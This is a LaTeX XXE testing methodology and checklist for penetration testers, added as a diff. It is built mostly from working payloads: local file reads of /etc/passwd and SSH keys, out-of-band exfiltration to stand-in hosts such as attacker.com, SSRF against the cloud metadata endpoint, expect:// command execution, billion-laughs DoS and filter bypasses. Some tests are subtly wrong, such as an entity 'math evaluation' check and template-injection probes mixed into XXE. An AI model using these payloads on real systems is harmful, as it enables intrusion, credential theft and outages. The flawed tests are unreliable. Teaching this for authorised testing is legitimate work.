@@ -1,0 +1,568 @@
+\documentclass{article}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{url}
+\usepackage{graphicx}
+\usepackage{geometry}
+\usepackage{amssymb}
+\usepackage{listings}
+\usepackage{hyperref}
+\usepackage{multicol}
+\usepackage{array}
+\usepackage{booktabs}
+\usepackage{xcolor}
+\usepackage{tcolorbox}
+\usepackage{fancyhdr}
+\usepackage{longtable}
+\tcbuselibrary{skins, breakable}
+
+% Configure listings for code highlighting
+\lstset{
+    numbers=left,
+    numberstyle=\tiny\color{gray},
+    basicstyle=\ttfamily\small,
+    breaklines=true,
+    frame=single,
+    backgroundcolor=\color{gray!5},
+    keywordstyle=\color{blue},
+    commentstyle=\color{green!50!black},
+    stringstyle=\color{red},
+    showstringspaces=false,
+    tabsize=2
+}
+
+% Define custom colors
+\definecolor{method}{RGB}{50,150,200}
+\definecolor{check}{RGB}{50,200,100}
+\definecolor{exploit}{RGB}{200,100,50}
+\definecolor{critical}{RGB}{200,50,50}
+
+% Create custom tcolorbox environments
+\newtcolorbox{methodbox}[1][]{colback=method!5,colframe=method!75!black,title=#1}
+\newtcolorbox{checklistbox}[1][]{colback=check!5,colframe=check!75!black,title=#1}
+\newtcolorbox{exploitbox}[1][]{colback=exploit!5,colframe=exploit!75!black,title=#1}
+\newtcolorbox{criticalbox}[1][]{colback=critical!5,colframe=critical!75!black,title=#1}
+
+\newtcolorbox{infobox}[1][]{
+    colback=blue!5,
+    colframe=blue!75!black,
+    title=#1,
+    boxrule=1pt,
+    arc=4pt,
+    breakable
+}
+
+
+\geometry{a4paper, left=20mm, right=20mm, top=20mm, bottom=20mm}
+\title{XXE Methodology and Testing Checklist}
+\author{Eyad Islam El-Taher}
+\date{\today}
+
+\begin{document}
+\maketitle
+
+
+\section{Phase 1: Discovery and Attack Surface Mapping}
+
+\subsection{1.1 Identify XML Endpoints}
+
+\begin{checklistbox}[Checklist: Finding XML Input Points]
+\begin{itemize}
+    \item  Check for \texttt{Content-Type: application/xml} in requests
+    \item  Check for \texttt{Content-Type: text/xml} in requests
+    \item  Look for SOAP APIs (\texttt{/wsdl}, \texttt{/soap}, \texttt{/api/v1})
+    \item  Identify file upload endpoints (SVG, DOCX, XLSX, PPTX)
+    \item  Check RSS/Atom feeds (\texttt{/rss}, \texttt{/feed}, \texttt{/xml})
+    \item  Look for sitemap files (\texttt{/sitemap.xml})
+    \item  Identify REST APIs that might accept XML
+    \item  Check for XML-RPC endpoints (\texttt{/xmlrpc}, \texttt{/RPC2})
+\end{itemize}
+\end{checklistbox}
+
+\subsection{1.2 Discover Hidden XML Attack Surface}
+
+\begin{methodbox}[Hidden Attack Surface Techniques]
+\begin{enumerate}
+    \item \textbf{Content Type Modification}
+    \begin{lstlisting}[basicstyle=\ttfamily\scriptsize]
+Change Content-Type to:
+- application/xml
+- text/xml
+- application/soap+xml
+    \end{lstlisting}
+    
+    \item \textbf{File Upload Testing}
+    \begin{lstlisting}[basicstyle=\ttfamily\scriptsize]
+Test upload of:
+- .svg files
+- .docx files (rename to .zip, modify XML inside)
+- .xlsx files
+- .pptx files
+    \end{lstlisting}
+    
+    \item \textbf{Parameter Pollution}
+    \begin{lstlisting}[basicstyle=\ttfamily\scriptsize]
+Add ?format=xml or &output=xml to URLs
+    \end{lstlisting}
+\end{enumerate}
+\end{methodbox}
+
+\section{Phase 2: Basic Detection}
+
+\subsection{2.1 Simple Entity Test}
+
+The first step is to determine if XML entities are being processed.
+
+\begin{exploitbox}[Basic Detection Payload]
+\begin{lstlisting}[language=XML]
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [
+    <!ENTITY test "TEST123">
+]>
+<root>&test;</root>
+\end{lstlisting}
+\end{exploitbox}
+
+\textbf{Expected Result:} The string "TEST123" appears in the response.
+
+\subsection{2.2 Mathematical Evaluation Test}
+
+Some parsers evaluate expressions within entities.
+
+\begin{exploitbox}[Mathematical Test Payload]
+\begin{lstlisting}[language=XML]
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [
+    <!ENTITY test SYSTEM "7*7">
+]>
+<root>&test;</root>
+\end{lstlisting}
+
+Or directly in the element:
+\begin{lstlisting}[language=XML]
+<root>{{7*7}}</root>
+<root>${7*7}</root>
+<root><%= 7*7 %></root>
+\end{lstlisting}
+\end{exploitbox}
+
+\subsection{2.3 External Entity Test (Out-of-Band)}
+
+Test if the parser makes external connections.
+
+\begin{exploitbox}[OOB Detection Payload]
+\begin{lstlisting}[language=XML]
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [
+    <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR-URL">
+    %xxe;
+]>
+<root>test</root>
+\end{lstlisting}
+\end{exploitbox}
+
+\textbf{Monitor:} DNS lookups and HTTP requests to your collaborator.
+
+\subsection{2.4 Detection Results Matrix}
+
+\begin{table}[h]
+\centering
+\begin{tabular}{|l|l|l|}
+\hline
+\textbf{Test} & \textbf{Positive Result} & \textbf{Conclusion} \\
+\hline
+Simple Entity & Entity replaced with value & XML parsing enabled \\
+\hline
+Math Evaluation & 49 returned & Expression evaluation possible \\
+\hline
+OOB Detection & DNS/HTTP callback & External entities enabled \\
+\hline
+Error Message & File not found error & Error disclosure possible \\
+\hline
+\end{tabular}
+
+\end{table}
+
+\section{Phase 3: Template Engine Identification}
+
+If mathematical expressions work, you might be dealing with a template engine rather than traditional XXE.
+
+\subsection{3.1 Template Engine Test Matrix}
+
+\begin{longtable}{|l|l|l|}
+\hline
+\textbf{Payload} & \textbf{Expected Result} & \textbf{Engine} \\
+\hline
+\{\{7*7\}\} & 49 & Jinja2 (Python) \\
+\hline
+$\{7*7\}$ & 49 & Freemarker (Java) \\
+\hline
+<\%= 7*7 \%> & 49 & EJS (Node.js) \\
+\hline
+\#\{7*7\} & 49 & Pug (Node.js) \\
+\hline
+\{\{7*7\}\} & \{\{7*7\}\} (no eval) & Twig (PHP) \\
+\hline
+\{\$smarty.version\} & Version number & Smarty (PHP) \\
+\hline
+\end{longtable}
+
+\section{Phase 4: Classic XXE Exploitation}
+
+\subsection{4.1 File Read (In-band)}
+
+\begin{exploitbox}[Linux File Read]
+\begin{lstlisting}[language=XML]
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+\end{lstlisting}
+\end{exploitbox}
+
+\subsection{4.2 Common Files to Read}
+
+\begin{checklistbox}[Target Files Checklist]
+\subsection*{Linux/Unix}
+\begin{itemize}
+    \item  \texttt{/etc/passwd} - User accounts
+    \item  \texttt{/etc/shadow} - Password hashes (requires root)
+    \item  \texttt{/etc/hosts} - Hostname resolution
+    \item  \texttt{/etc/hostname} - System hostname
+\end{itemize}
+
+\subsection*{Windows}
+\begin{itemize}
+    \item  \texttt{C:\textbackslash windows\textbackslash win.ini}
+    \item  \texttt{C:\textbackslash windows\textbackslash system32\textbackslash drivers\textbackslash etc\textbackslash hosts}
+\end{itemize}
+
+\subsection*{Application Specific}
+\begin{itemize}
+    \item  \texttt{/WEB-INF/web.xml} (Java)
+    \item  \texttt{/app/config.py} (Python)
+    \item  \texttt{/config/database.yml} (Ruby)
+    \item  \texttt{.env} - Environment variables
+    \item  \texttt{id\_rsa} - SSH private keys
+\end{itemize}
+\end{checklistbox}
+
+\subsection{4.3 PHP Wrappers}
+
+\begin{exploitbox}[PHP Filter Wrappers]
+\begin{lstlisting}[language=XML]
+<!-- Base64 encode to handle binary files -->
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+
+<!-- Read PHP source code -->
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=config.php">
+
+<!-- Expect wrapper (RCE if enabled) -->
+<!ENTITY xxe SYSTEM "expect://id">
+\end{lstlisting}
+\end{exploitbox}
+
+\section{Phase 5: Blind XXE Exploitation}
+
+\subsection{5.1 Out-of-Band (OOB) Detection}
+
+\begin{exploitbox}[OOB Parameter Entity Test]
+\begin{lstlisting}[language=XML]
+<!DOCTYPE foo [
+    <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR.com/test">
+    %xxe;
+]>
+<root>test</root>
+\end{lstlisting}
+\end{exploitbox}
+
+\subsection{5.2 OOB Data Exfiltration}
+
+\subsubsection{Step 1: Host Malicious DTD}
+\begin{lstlisting}[language=XML]
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER.com/?data=%file;'>">
+%eval;
+%exfil;
+\end{lstlisting}
+
+\subsubsection{Step 2: Trigger Payload}
+\begin{lstlisting}[language=XML]
+<!DOCTYPE foo [
+    <!ENTITY % xxe SYSTEM "http://YOUR-SERVER.com/malicious.dtd">
+    %xxe;
+]>
+<root>test</root>
+\end{lstlisting}
+
+\subsection{5.3 Error-Based Blind XXE}
+
+\begin{exploitbox}[Error-Based Exfiltration]
+\begin{lstlisting}[language=XML]
+<!DOCTYPE foo [
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+    %eval;
+    %error;
+]>
+<root>test</root>
+\end{lstlisting}
+\end{exploitbox}
+
+\subsection{5.4 Local DTD Repurposing}
+
+\begin{exploitbox}[GNOME docbookx.dtd Example]
+\begin{lstlisting}[language=XML]
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+\end{lstlisting}
+\end{exploitbox}
+
+\subsection{5.5 Common Local DTD Paths}
+
+\begin{checklistbox}[Local DTD Discovery Paths]
+\subsection*{Linux}
+\begin{itemize}
+    \item  \texttt{/usr/share/yelp/dtd/docbookx.dtd}
+    \item  \texttt{/usr/share/xml/schema/docbook/4.5/docbookx.dtd}
+    \item  \texttt{/usr/share/xml/schema/xml-core/tr9401.dtd}
+    \item  \texttt{/usr/share/java/xml-commons/xml-commons-resolver-1.2.dtd}
+\end{itemize}
+
+\subsection*{Windows}
+\begin{itemize}
+    \item  \texttt{C:\textbackslash Program Files\textbackslash Common Files\textbackslash Microsoft Shared\textbackslash VBA\textbackslash VBA6\textbackslash vbext6.olb}
+\end{itemize}
+
+\subsection*{Java Applications}
+\begin{itemize}
+    \item  \texttt{/WEB-INF/web.xml}
+    \item  \texttt{/WEB-INF/struts-config.xml}
+    \item  \texttt{/META-INF/faces-config.xml}
+\end{itemize}
+\end{checklistbox}
+
+\section{Phase 6: XInclude Attacks}
+
+Use XInclude when you cannot control the full XML document but control a single data value.
+
+\begin{exploitbox}[XInclude Payload]
+\begin{lstlisting}[language=XML]
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+    <data>
+        <xi:include parse="text" href="file:///etc/passwd"/>
+    </data>
+</root>
+\end{lstlisting}
+\end{exploitbox}
+
+\begin{exploitbox}[XInclude with HTTP]
+\begin{lstlisting}[language=XML]
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+    <xi:include href="http://internal-server/admin"/>
+</root>
+\end{lstlisting}
+\end{exploitbox}
+
+\section{Phase 7: SSRF via XXE}
+
+Use XXE to probe internal networks and services.
+
+\begin{exploitbox}[SSRF Payloads]
+\begin{lstlisting}[language=XML]
+<!-- Localhost scanning -->
+<!ENTITY xxe SYSTEM "http://127.0.0.1:22">
+<!ENTITY xxe SYSTEM "http://localhost:8080/admin">
+<!ENTITY xxe SYSTEM "http://127.0.0.1:3306">
+
+<!-- Internal network scanning -->
+<!ENTITY xxe SYSTEM "http://10.0.0.1:80">
+<!ENTITY xxe SYSTEM "http://192.168.1.1:443">
+
+<!-- Cloud metadata -->
+<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data/">
+
+<!-- Internal services -->
+<!ENTITY xxe SYSTEM "http://internal-api.company.com/health">
+<!ENTITY xxe SYSTEM "http://kubernetes.default.svc.cluster.local">
+\end{lstlisting}
+\end{exploitbox}
+
+\section{Phase 8: Denial of Service (DoS)}
+
+\begin{exploitbox}[Billion Laughs Attack]
+\begin{lstlisting}[language=XML]
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+    <!ENTITY lol "lol">
+    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+\end{lstlisting}
+\end{exploitbox}
+
+\section{Phase 9: Bypass Techniques}
+
+\subsection{9.1 Encoding Bypasses}
+
+\begin{methodbox}[Character Encoding Tricks]
+\begin{itemize}
+    \item UTF-16 encoding to bypass DTD filters
+    \item UTF-32 encoding for some parsers
+    \item Use HTML entities: \texttt{\&\#x25;} for \%
+    \item Use hexadecimal entities: \texttt{\&\#x25;} 
+    \item Use decimal entities: \texttt{\&\#37;}
+\end{itemize}
+\end{methodbox}
+
+\subsection{9.2 Filter Bypass Payloads}
+
+\begin{exploitbox}[Bypass Attempts]
+\begin{lstlisting}[language=XML]
+<!-- String concatenation -->
+<!ENTITY % start "<!ENTITY&#x25;evil SYSTEM 'file:///etc/passwd'>">
+
+<!-- Using comments -->
+<!ENTITY % file SYSTEM "file:///etc/passwd" >
+<!--]>
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/%file;'>">
+%eval;
+%exfil;
+<!--
+-->
+
+<!-- Case manipulation -->
+<!ENTITY % FiLe SYSTEM "file:///etc/passwd">
+
+<!-- Whitespace variation -->
+<!ENTITY%0A%0dfile SYSTEM"file:///etc/passwd">
+\end{lstlisting}
+\end{exploitbox}
+
+\section{Phase 10: File Upload XXE}
+
+\subsection{10.1 SVG XXE}
+
+\begin{exploitbox}[Malicious SVG]
+\begin{lstlisting}[language=XML]
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ 
+    <!ENTITY xxe SYSTEM "file:///etc/passwd" > 
+]>
+<svg width="128px" height="128px" 
+     xmlns="http://www.w3.org/2000/svg" 
+     xmlns:xlink="http://www.w3.org/1999/xlink" 
+     version="1.1">
+    <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+\end{lstlisting}
+\end{exploitbox}
+
+\subsection{10.2 Office Document XXE}
+
+\begin{methodbox}[DOCX/XLSX/PPTX Attack]
+\begin{enumerate}
+    \item Rename file to .zip
+    \item Extract contents
+    \item Modify \texttt{[Content\_Types].xml} or other XML files
+    \item Add XXE payload
+    \item Re-zip and rename back to original extension
+    \item Upload file
+\end{enumerate}
+\end{methodbox}
+
+\newpage
+\section{Complete Testing Checklist}
+
+% Add amssymb package in preamble for \square
+% \usepackage{amssymb}
+
+\begin{longtable}{|p{2.5cm}|p{9cm}|p{1.5cm}|}
+\hline
+\textbf{Phase} & \textbf{Test} & \textbf{Status} \\
+\hline
+\endfirsthead
+\hline
+\textbf{Phase} & \textbf{Test} & \textbf{Status} \\
+\hline
+\endhead
+\hline
+\multicolumn{3}{|r|}{Continued on next page} \\
+\hline
+\endfoot
+\hline
+\endlastfoot
+
+Discovery & Identify all XML endpoints & $\square$ \\
+\hline
+Discovery & Test file upload endpoints & $\square$ \\
+\hline
+Discovery & Modify Content-Type headers & $\square$ \\
+\hline
+Detection & Simple entity test & $\square$ \\
+\hline
+Detection & OOB collaborator test & $\square$ \\
+\hline
+Detection & Error message analysis & $\square$ \\
+\hline
+Classic XXE & Linux file read (\texttt{/etc/passwd}) & $\square$ \\
+\hline
+Classic XXE & Windows file read (\texttt{win.ini}) & $\square$ \\
+\hline
+Classic XXE & PHP wrapper test & $\square$ \\
+\hline
+Blind XXE & OOB data exfiltration & $\square$ \\
+\hline
+Blind XXE & Error-based exfiltration & $\square$ \\
+\hline
+Blind XXE & Local DTD repurposing & $\square$ \\
+\hline
+XInclude & XInclude payload test & $\square$ \\
+\hline
+SSRF & Localhost port scan & $\square$ \\
+\hline
+SSRF & Internal network scan & $\square$ \\
+\hline
+SSRF & Cloud metadata access & $\square$ \\
+\hline
+File Upload & SVG XXE test & $\square$ \\
+\hline
+File Upload & DOCX XXE test & $\square$ \\
+\hline
+Bypasses & UTF-16 encoding test & $\square$ \\
+\hline
+Bypasses & Character entity encoding & $\square$ \\
+\hline
+DoS & Billion laughs test & $\square$ \\
+\hline
+\end{longtable}
+
+\section{Resource Note: PayloadsAllTheThings}
+
+\begin{infobox}[External Resource]
+For an extensive, community-maintained collection of XXE payloads, refer to the following GitHub repository:\\
+
+\url{https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE\%20Injection\#xxe-inside-svg}\\
+
+This repository is an essential reference for testers, providing dozens of ready-to-use payloads for different parsers and bypass techniques.
+\end{infobox}
+
+\end{document}
